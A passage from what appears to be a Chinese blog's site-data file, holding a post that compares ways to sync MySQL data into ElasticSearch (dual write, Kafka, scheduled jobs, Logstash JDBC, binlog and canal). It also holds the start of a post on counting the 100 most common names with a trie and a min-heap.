0.034em;\">4、不方便做扩展</span></p></td></tr></tbody></table>\n\n\n\n**2、异步写入方案**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/2.png)\n在Mysql上进行数据增删改操作时，通过MQ（如Kafka）异步将数据写入到ElasticSearch中。这种异步方式可以降低Mysql的写入延迟并有效的防止了ElasticSearch自身问题而影响到Mysql数据的写入，但是可能会出现存在Mysql和ElasticSearch数据长时间的不一致的现象。此方案的优缺点如下：\n\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">性能高；数据不易丢失；支持多数据源写入<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、增加了系统的复杂度，因为需要接入MQ；</p><p>2、数据之间的同步可能延迟高，MQ消费可能不及时；</p><p>3、发送消息需要硬编码到业务中；</p></td></tr></tbody></table>\n\n\n\n**3、定时任务同步方案**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/3.png)\n定时任务的方案就是设定一个频率去Mysql中拉取数据来同步到ElasticSearch中，但是这个频率如何选择要根据自身的业务特性来选取。当前，如果频率设置很高就给系统造成一定的压力（如CPU、内存使用率居高不下），频率设置很低数据的实时性比较差。此方案的优缺点如下：\n\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、实时性差，因为依赖定时任务的执行频率；</p><p>2、给数据库带来一定的压力，因为是不断的轮询数据库；</p></td></tr></tbody></table>\n\n\n\n**4、使用Logstash同步**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/4.png)\n此方案是针对定时任务同步的方案的一种改进，原理是Logstash提供了JDBC插件，它可以定期使用SQL查询数据库并且获取数据变化，然后通过配置来实现Mysql数据同步到ElasticSearch中。Logstash的配置：\n\n```\ninput {`  `jdbc {`    `jdbc_driver_library => \"/path/to/mysql-connector-java-x.x.x-bin.jar\"`    `jdbc_driver_class => \"com.mysql.jdbc.Driver\"`    `jdbc_connection_string => \"jdbc:mysql://192.168.202.12:3306/order\"`    `jdbc_user => \"root\"`    `jdbc_password => \"root123456\"`    `schedule => \"* * * * *\"`    `statement => \"SELECT * FROM order\"`  `}``}` `filter {`  `# 在此处添加任何特定的数据过滤器`  `}` `output {`  `elasticsearch {`    `hosts => [\"192.168.203.21:9200\"]`    `index => \"order\"`    `document_id => \"%{unique_id_field}\"`  `}``}\n```\n\n此方案的优缺点如下：\n\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、实时性差，因为Logstash是定期同步数据的；</p><p>2、需要中间件的支持；</p></td></tr></tbody></table>\n\n\n\n**5、使用binlog同步——自建binlog服务中心**\n\n![](./2024/06/16/电商中es和mysql数据同步方案/5.png)\n此方案是先读取Mysql的binlog日志，然后将binlog日志交给binlog中心服务处理，然后把读取的binlog转化成MQ消息，通过消费MQ消息将Mysql中的数据同步到ElasticSearch中。此方案的优缺点如下：\n\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">性能高；业务解耦；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、构建binlog中心服务复杂；</p><p>2、采用MQ消费binlog也会存在延迟风险；</p></td></tr></tbody></table>\n\n\n\n**6、使用binlog同步——开源中间件**\n\n基于binlog同步的方式，目前有许多的优秀数据迁移工具可以实现，如canal，其实现的原理是binlog订阅的方式，模拟一个Mysql的Slave订阅 binlog日志，然后通过binlog将数据同步到监听者中。\n\n![](./2024/06/16/电商中es和mysql数据同步方案/6.png)\n总结：\n\n数据同步方案有多种，需要根据自身的业务对数据的实时性来选择，业内常用的还是使用binlog的方案实现。","slug":"电商中es和mysql数据同步方案","published":1,"updated":"2024-06-16T05:27:35.613Z","comments":1,"layout":"post","photos":[],"_id":"clylh1ryu002fbsuh94r730eh","content":"<p>在实际项目开发中，常用Mysql作为业务数据库，ElasticSearch作为查询库。ElasticSearch主要用来应对海量数据的复杂查询，提高查询效率和缓解Mysql数据库的压力。如何实现 MySQL 数据库和ElasticSearch之间的数据同步也是为非常关键的，下面介绍几种常见的数据同步方案方案。</p>\n<p><strong>1、同步双写方案</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/1.png\"><br>同步双写是指在Mysql上进行数据增删改操作时，同步将数据写入到ElasticSearch中，使用此方式保证Mysql与ElasticSearch中的数据一致性的优&#x2F;缺点如下：</p>\n<table style=\"visibility: visible;\"><tbody style=\"visibility: visible;\"><tr style=\"visibility: visible;\"><td width=\"90\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">实现简单；实时性高</td></tr><tr style=\"visibility: visible;\"><td width=\"90\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\"><p style=\"visibility: visible;\">1、存在数据丢失风险<span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: var(--articleFontsize); letter-spacing: 0.034em; visibility: visible;\">；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">2、性能不高；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\"></span><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">3、和业务之间的耦合性强；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\"></span><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">4、不方便做扩展</span></p></td></tr></tbody></table>\n\n\n\n<p><strong>2、异步写入方案</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/2.png\"><br>在Mysql上进行数据增删改操作时，通过MQ（如Kafka）异步将数据写入到ElasticSearch中。这种异步方式可以降低Mysql的写入延迟并有效的防止了ElasticSearch自身问题而影响到Mysql数据的写入，但是可能会出现存在Mysql和ElasticSearch数据长时间的不一致的现象。此方案的优缺点如下：</p>\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">性能高；数据不易丢失；支持多数据源写入<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、增加了系统的复杂度，因为需要接入MQ；</p><p>2、数据之间的同步可能延迟高，MQ消费可能不及时；</p><p>3、发送消息需要硬编码到业务中；</p></td></tr></tbody></table>\n\n\n\n<p><strong>3、定时任务同步方案</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/3.png\"><br>定时任务的方案就是设定一个频率去Mysql中拉取数据来同步到ElasticSearch中，但是这个频率如何选择要根据自身的业务特性来选取。当前，如果频率设置很高就给系统造成一定的压力（如CPU、内存使用率居高不下），频率设置很低数据的实时性比较差。此方案的优缺点如下：</p>\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、实时性差，因为依赖定时任务的执行频率；</p><p>2、给数据库带来一定的压力，因为是不断的轮询数据库；</p></td></tr></tbody></table>\n\n\n\n<p><strong>4、使用Logstash同步</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/4.png\"><br>此方案是针对定时任务同步的方案的一种改进，原理是Logstash提供了JDBC插件，它可以定期使用SQL查询数据库并且获取数据变化，然后通过配置来实现Mysql数据同步到ElasticSearch中。Logstash的配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">input &#123;`  `jdbc &#123;`    `jdbc_driver_library =&gt; &quot;/path/to/mysql-connector-java-x.x.x-bin.jar&quot;`    `jdbc_driver_class =&gt; &quot;com.mysql.jdbc.Driver&quot;`    `jdbc_connection_string =&gt; &quot;jdbc:mysql://192.168.202.12:3306/order&quot;`    `jdbc_user =&gt; &quot;root&quot;`    `jdbc_password =&gt; &quot;root123456&quot;`    `schedule =&gt; &quot;* * * * *&quot;`    `statement =&gt; &quot;SELECT * FROM order&quot;`  `&#125;``&#125;` `filter &#123;`  `# 在此处添加任何特定的数据过滤器`  `&#125;` `output &#123;`  `elasticsearch &#123;`    `hosts =&gt; [&quot;192.168.203.21:9200&quot;]`    `index =&gt; &quot;order&quot;`    `document_id =&gt; &quot;%&#123;unique_id_field&#125;&quot;`  `&#125;``&#125;</span><br></pre></td></tr></table></figure>\n\n<p>此方案的优缺点如下：</p>\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、实时性差，因为Logstash是定期同步数据的；</p><p>2、需要中间件的支持；</p></td></tr></tbody></table>\n\n\n\n<p><strong>5、使用binlog同步——自建binlog服务中心</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/5.png\"><br>此方案是先读取Mysql的binlog日志，然后将binlog日志交给binlog中心服务处理，然后把读取的binlog转化成MQ消息，通过消费MQ消息将Mysql中的数据同步到ElasticSearch中。此方案的优缺点如下：</p>\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">性能高；业务解耦；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、构建binlog中心服务复杂；</p><p>2、采用MQ消费binlog也会存在延迟风险；</p></td></tr></tbody></table>\n\n\n\n<p><strong>6、使用binlog同步——开源中间件</strong></p>\n<p>基于binlog同步的方式，目前有许多的优秀数据迁移工具可以实现，如canal，其实现的原理是binlog订阅的方式，模拟一个Mysql的Slave订阅 binlog日志，然后通过binlog将数据同步到监听者中。</p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/6.png\"><br>总结：</p>\n<p>数据同步方案有多种，需要根据自身的业务对数据的实时性来选择，业内常用的还是使用binlog的方案实现。</p>\n","cover":"/img/haibian.png","cover_type":"img","excerpt":"","more":"<p>在实际项目开发中，常用Mysql作为业务数据库，ElasticSearch作为查询库。ElasticSearch主要用来应对海量数据的复杂查询，提高查询效率和缓解Mysql数据库的压力。如何实现 MySQL 数据库和ElasticSearch之间的数据同步也是为非常关键的，下面介绍几种常见的数据同步方案方案。</p>\n<p><strong>1、同步双写方案</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/1.png\"><br>同步双写是指在Mysql上进行数据增删改操作时，同步将数据写入到ElasticSearch中，使用此方式保证Mysql与ElasticSearch中的数据一致性的优&#x2F;缺点如下：</p>\n<table style=\"visibility: visible;\"><tbody style=\"visibility: visible;\"><tr style=\"visibility: visible;\"><td width=\"90\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">实现简单；实时性高</td></tr><tr style=\"visibility: visible;\"><td width=\"90\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all; visibility: visible;\"><p style=\"visibility: visible;\">1、存在数据丢失风险<span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: var(--articleFontsize); letter-spacing: 0.034em; visibility: visible;\">；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">2、性能不高；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\"></span><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">3、和业务之间的耦合性强；</span></p><p><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\"></span><span style=\"font-family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: var(--articleFontsize);letter-spacing: 0.034em;\">4、不方便做扩展</span></p></td></tr></tbody></table>\n\n\n\n<p><strong>2、异步写入方案</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/2.png\"><br>在Mysql上进行数据增删改操作时，通过MQ（如Kafka）异步将数据写入到ElasticSearch中。这种异步方式可以降低Mysql的写入延迟并有效的防止了ElasticSearch自身问题而影响到Mysql数据的写入，但是可能会出现存在Mysql和ElasticSearch数据长时间的不一致的现象。此方案的优缺点如下：</p>\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">性能高；数据不易丢失；支持多数据源写入<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、增加了系统的复杂度，因为需要接入MQ；</p><p>2、数据之间的同步可能延迟高，MQ消费可能不及时；</p><p>3、发送消息需要硬编码到业务中；</p></td></tr></tbody></table>\n\n\n\n<p><strong>3、定时任务同步方案</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/3.png\"><br>定时任务的方案就是设定一个频率去Mysql中拉取数据来同步到ElasticSearch中，但是这个频率如何选择要根据自身的业务特性来选取。当前，如果频率设置很高就给系统造成一定的压力（如CPU、内存使用率居高不下），频率设置很低数据的实时性比较差。此方案的优缺点如下：</p>\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、实时性差，因为依赖定时任务的执行频率；</p><p>2、给数据库带来一定的压力，因为是不断的轮询数据库；</p></td></tr></tbody></table>\n\n\n\n<p><strong>4、使用Logstash同步</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/4.png\"><br>此方案是针对定时任务同步的方案的一种改进，原理是Logstash提供了JDBC插件，它可以定期使用SQL查询数据库并且获取数据变化，然后通过配置来实现Mysql数据同步到ElasticSearch中。Logstash的配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">input &#123;`  `jdbc &#123;`    `jdbc_driver_library =&gt; &quot;/path/to/mysql-connector-java-x.x.x-bin.jar&quot;`    `jdbc_driver_class =&gt; &quot;com.mysql.jdbc.Driver&quot;`    `jdbc_connection_string =&gt; &quot;jdbc:mysql://192.168.202.12:3306/order&quot;`    `jdbc_user =&gt; &quot;root&quot;`    `jdbc_password =&gt; &quot;root123456&quot;`    `schedule =&gt; &quot;* * * * *&quot;`    `statement =&gt; &quot;SELECT * FROM order&quot;`  `&#125;``&#125;` `filter &#123;`  `# 在此处添加任何特定的数据过滤器`  `&#125;` `output &#123;`  `elasticsearch &#123;`    `hosts =&gt; [&quot;192.168.203.21:9200&quot;]`    `index =&gt; &quot;order&quot;`    `document_id =&gt; &quot;%&#123;unique_id_field&#125;&quot;`  `&#125;``&#125;</span><br></pre></td></tr></table></figure>\n\n<p>此方案的优缺点如下：</p>\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">实现简单；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、实时性差，因为Logstash是定期同步数据的；</p><p>2、需要中间件的支持；</p></td></tr></tbody></table>\n\n\n\n<p><strong>5、使用binlog同步——自建binlog服务中心</strong></p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/5.png\"><br>此方案是先读取Mysql的binlog日志，然后将binlog日志交给binlog中心服务处理，然后把读取的binlog转化成MQ消息，通过消费MQ消息将Mysql中的数据同步到ElasticSearch中。此方案的优缺点如下：</p>\n<table width=\"578\"><tbody><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">优点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\">性能高；业务解耦；无额外的代码的侵入业务中<br></td></tr><tr><td width=\"90\" valign=\"top\" style=\"word-break: break-all;\">缺点</td><td width=\"426\" valign=\"top\" style=\"word-break: break-all;\"><p>1、构建binlog中心服务复杂；</p><p>2、采用MQ消费binlog也会存在延迟风险；</p></td></tr></tbody></table>\n\n\n\n<p><strong>6、使用binlog同步——开源中间件</strong></p>\n<p>基于binlog同步的方式，目前有许多的优秀数据迁移工具可以实现，如canal，其实现的原理是binlog订阅的方式，模拟一个Mysql的Slave订阅 binlog日志，然后通过binlog将数据同步到监听者中。</p>\n<p><img src=\"/./2024/06/16/%E7%94%B5%E5%95%86%E4%B8%ADes%E5%92%8Cmysql%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E6%96%B9%E6%A1%88/6.png\"><br>总结：</p>\n<p>数据同步方案有多种，需要根据自身的业务对数据的实时性来选择，业内常用的还是使用binlog的方案实现。</p>\n"},{"title":"统计全国重名最多的前100个","date":"2024-06-02T09:16:17.000Z","_content":"\n\n阿里面试：全国14亿个姓名，统计出重名最多的前100个\n===========================\n\n\n> 全国14亿人的数据中，统计出重名人数最多的前100位姓名\n\n最近有小伙伴在面试阿里，遇到这个面试题。小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。\n\n**TOP N面试题是常见的算法题。**\n\nTOP N 统计的面试题，是一道非常常见的题目，大家一定要掌握好。\n\n\n1\\. 问题描述:\n---------\n\n我们需要从全国14亿人的数据中，统计出重名人数最多的前100位姓名\n\n2\\. 问题分析:\n---------\n\n我们的目标：是找到重名人数最多的前100个姓名,\n\n这意味着需要两步：\n\n*   需要有一个高效的数据结构来统计每个名字出现的次数,\n\n*   并快速找到出现次数最多的前100个名字.\n\n\n所以这个问题就转化成了下一个问题： 使用一种低成本、高性能的数据结构，来统计每个名字出现的次数。\n\n3\\. 如何选择一种最低成本、最高性能的数据结构？\n-------------------------\n\n常规的数据结构，选型如下:\n\n*   **数组**:\n\n\n如果姓名的字符集范围很大(支持所有的Unicode字符)，那么，需要极大且稀疏的数组,导致内存浪费严重,也不适合处理动态长度和多样性的字符串集合\n\n*   **链表**:\n\n    链表的插入和查找的操作时间复杂度为O(N), 并且，在大规模数据下性能低下,也不适合快速查找的场景\n\n*   **跳表**:\n\n\n跳表的插入、删除和查找操作的平均事件复杂度都是O(logN)，\n\n跳表式空间换时间的思想，主要是它需要额外的空间来维护多级索引，每个元素在最坏的情况下需要额外的存储空间，导致总的空间复杂度为O(N log N),\n\n在频繁的插入和查询的场景中，效率不高。\n\n来到我们现在这个场景，统计每个名字出现的次数时，不如哈希表在时间和空间的效率高效，哈希表的O(1)时间复杂度更适合大规模的数据频繁的插入和查询。\n\n*   **哈希表:**\n\n\n哈希表的插入和查找的时间复杂度都是O(1),\n\n但是在极端的情况下，哈希冲突会导致时间复杂度退化到O(N)，\n\n在空间效率中，哈希表需要额外的空间来维护键值对，来到这个场景，空间效率和哈希冲突都有潜在风险，\n\n最重要的是哈希表不能共享前缀，在处理大量的具有共同前缀的数据时候，也不适合。\n\n*   **平衡二叉搜索树(如AVL树或红黑树)**:\n\n\n能够维护有序数据,支持快速的插入、删除和查找操作,但在字符串的比较上,性能不如哈希表和Trie高效\n\n*   **前缀树**:\n\n\n前缀树通过共享前缀节点,节省了大量存储空间, 实现了成本的最低化\n\n前缀树对于字符串操作非常高效, 在这个问题中, 有很多名字共享相同前缀, Trie的结构能有效利用这一特点。\n\n经过上面的分析,能够看到Trie更适合统计每个名字出现的次数\n\n4\\. 如何快速筛选出Top 100？\n-------------------\n\n当知道了所有姓名出现的次数之后,、怎么样快速筛选出其中出现次数最多的前100个?\n\n首先想到的是直接排序。\n\n这个问题中,对14亿数据直接排序会有效率的问题，操作非常耗时。\n\n所以直接排序， 这种方法不可取。\n\n我们的目标是找到次数最多的前100个,可以利用堆的性质来完成。\n\n小顶堆总是保持堆顶为当前堆中最小的元素，这样可以确保当新的元素插入时，如果新元素大于堆顶元素，堆顶元素会被替换掉\n\n使用小顶堆的步骤:\n\n1.初始化一个小顶堆:设为100\n\n2.遍历每个姓名及其出现的次数:\n\n*   如果堆的大小小于100，将当前姓名及其出现次数插入堆中。\n\n*   如果当前姓名的出现次数大于堆顶元素的出现次数，则移除堆顶元素，并将当前姓名及其出现次数插入堆中。\n\n\n3.遍历完所有的姓名后,堆中即为重名人数最多的前100个姓名\n\n所以解决这个问题使用了前缀树 + 小顶堆\n\n5\\. 前缀树Trie树介绍\n--------------\n\n在计算机科学中，trie，又称前缀树或字典树，使用一些单词来构建Trie树,如下图所示:\n\n![](./2024/06/02/统计全国重名最多的前100个/1.png)\n\n从图片中可以看到一些有意思的特性:\n\n*   根节点没有数据\n\n*   从根节点到某一个节点,将他们的路径进行连接就组成了对应的字符串\n\n\n定义:\n\n> Trie树，又称为前缀树或字典树, 是一种用于高效存储和检索字符串集合的数据结构, 每个节点代表一个字符, 边表示从一个字符到另一个字符的路径, Trie树通过共享相同前缀的节点来节省存储空间\n\nTrie树是一种有序树，用于保存关联数组，其中的键通常是字符串。\n\n与二叉查找树不同，Trie树 的 键不是直接保存在节点中，而是由节点在树中的位置决定。\n\n一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。\n\n一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。\n\ntrie中的键通常是字符串，但也可以是其它的结构。\n\ntrie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。\n\n比如，bitwise trie中的键是一串位元，可以用于表示整数或者内存地址\n\n**Trie树基本性质**\n\n1，根节点不包含字符，除根节点意外每个节点只包含一个字符。\n\n2，从根节点到某一个节点，路径上经过的字符连接起来，为该节点对应的字符串。\n\n3，每个节点的所有子节点包含的字符串不相同。\n\n**Trie树优点**：\n\n可以最大限度地减少无谓的字符串比较，故可以用于词频统计和大量字符串排序。\n\n跟哈希表比较：\n\n1，最坏情况时间复杂度比hash表好\n\n2，没有冲突，除非一个key对应多个值（除key外的其他信息）\n\n3，自带排序功能（类似Radix Sort），中序遍历trie可以得到排序。\n\n**Trie树缺点**：\n\n当所有关键字都不具有相同或类似的前缀，空间消耗过大.\n\n6\\. Trie树的基本操作:\n---------------\n\n*   插入:将一个字符串逐字符插入到Trie树中\n\n*   查找:检查Trie树中是否存在某个字符串\n\n*   前缀匹配:查找所有以某个前缀开头的字符串\n\n*   删除:从Trie树中删除一个字符串\n\n\n7\\. Trie树的应用场景:\n---------------\n\n1.字符串检索:\n\n*   应用场景:快速检索字典中的单词\n\n*   使用原因:Trie树通过逐字符匹配,可以在O(L)时间内完成字符串的检索,其中L是字符串的长度,比传统的线性搜索更加高效\n\n\n2.自动补全:\n\n*   应用场景:搜索引擎和输入法中的自动补全功能\n\n*   适用原因:Trie树可以通过前缀查找快速提供所有以给定前缀开头的单词,有效提升用户输入体验\n\n\n3.前缀匹配:\n\n*   应用场景:寻找以特定前缀开头的所有字符串,如电话号码前缀匹配\n\n*   适用原因:Trie树天生适合处理前缀匹配问题,可以在O(L)时间内找到所有以特定前缀开头的字符串\n\n\n4.词频统计:\n\n*   应用场景:文本分析中统计单词出现频率\n\n*   适用原因:Trie树可以在插入过程中记录每个单词的出现次数,通过遍历Trie树可以快速统计所有单词的频率\n\n\n为什么适合这些场景:\n\n5.多模式匹配:\n\n*   应用场景:从文本中同时搜索多个模式(模式匹配算法)\n\n*   适用原因:Trie树可以构建多个模式的结构,通过一次遍历文本同时匹配多个模式,提高匹配效率\n\n\n为什么适用于这些场景:\n\n1.空间效率:\n\n*   共享前缀:Trie树通过共享前缀节点，减少了重复存储相同前缀的空间开销。\n\n*   节省内存:对于大量前缀相同的字符串集合，Trie树显著节省内存使用。\n\n\n2.时间效率:\n\n*   